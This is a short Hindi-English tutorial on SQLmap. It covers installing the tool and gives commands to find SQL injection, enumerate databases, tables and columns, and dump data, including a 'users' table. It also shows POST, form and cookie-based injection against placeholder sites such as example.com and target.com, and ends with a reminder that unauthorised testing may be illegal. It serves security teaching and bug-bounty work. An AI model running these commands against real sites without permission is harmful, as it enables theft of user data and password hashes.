🔎 SQLmap क्या है?

SQLmap एक powerful open-source penetration testing tool है जिसका उपयोग websites में SQL Injection vulnerability detect और exploit करने के लिए किया जाता है।

यह tool automatically database information निकाल सकता है जैसे:

  • Database Names
  • Tables
  • Columns
  • User Data
  • Password Hashes

⚙️ Kali NetHunter / Kali Linux Installation

Check करें कि SQLmap installed है या नहीं:

sqlmap --version

अगर install नहीं है:

sudo apt update sudo apt install sqlmap

🚀 Basic SQLmap Commands

1. SQL Injection Scan

sqlmap -u "http://example.com/page.php?id=1"

2. Databases निकालना

sqlmap -u "http://example.com/page.php?id=1" --dbs

3. Tables निकालना

sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

4. Columns निकालना

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

5. Data Dump करना

sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

🧪 Bug Bounty Example

Example vulnerable URL:

http://target.com/product.php?id=1

Database Scan:

sqlmap -u "http://target.com/product.php?id=1" --batch --dbs

Tables:

sqlmap -u "http://target.com/product.php?id=1" -D users --tables

Data Dump:

sqlmap -u "http://target.com/product.php?id=1" -D users -T users --dump

⚡ Advanced Commands

POST Request Attack

sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"

Forms Scan

sqlmap -u "http://example.com/login.php" --forms

Cookie Attack

sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=12345"

⚠️ Important Note

SQLmap का उपयोग केवल ethical hacking, penetration testing और bug bounty programs में करें। बिना permission किसी website को test करना illegal हो सकता है।
